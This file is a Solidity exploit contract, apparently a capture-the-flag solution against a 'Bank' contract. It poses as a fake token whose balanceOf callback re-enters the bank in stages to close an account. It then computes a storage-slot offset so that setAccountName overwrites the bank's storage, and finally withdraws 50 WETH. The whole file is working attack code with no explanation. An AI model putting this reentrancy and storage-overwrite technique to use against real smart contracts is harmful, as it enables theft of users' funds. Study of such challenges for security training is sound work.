pragma solidity 0.4.24;

import "../bank/Bank.sol";

contract Banker {
    uint8 stage;
    mapping(address => uint256) balances;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    constructor() {
        balances[address(this)] = 100;
    }

    function attack(Bank target) external {
        target.depositToken(0, address(this), 1);

        address b = address(this);
        bytes32 pos0 = keccak256(abi.encode(WETH, uint256(keccak256(keccak256(abi.encode(b, 2)))) + 2));
        bytes32 pos1 = keccak256(keccak256(abi.encode(b, 2)));

        uint256 diff = uint256(pos0) - uint256(pos1);

        target.setAccountName(diff/3, "REKTLOL");
        target.withdrawToken(0, WETH, 50 ether); 
    }

    function transferFrom(address from, address to, uint256 amount) external returns(bool) {
        balances[to] += amount;
        balances[from] -= amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns(bool) {
        balances[to] += amount;
        return true;
    }

    function balanceOf(address who) external returns(uint256) {
        if(stage == 0) {
            stage++ ;
            Bank(msg.sender).withdrawToken(0, address(this), 0);
            return balances[who];
        }
        if(stage == 1) {
            stage++;
            Bank(msg.sender).depositToken(0, address(this), 0);
        }
        if(stage == 2) {
            stage++;
            Bank(msg.sender).closeLastAccount();
        }
        if(stage == 3) {
            return balances[who];
        }
    }
}

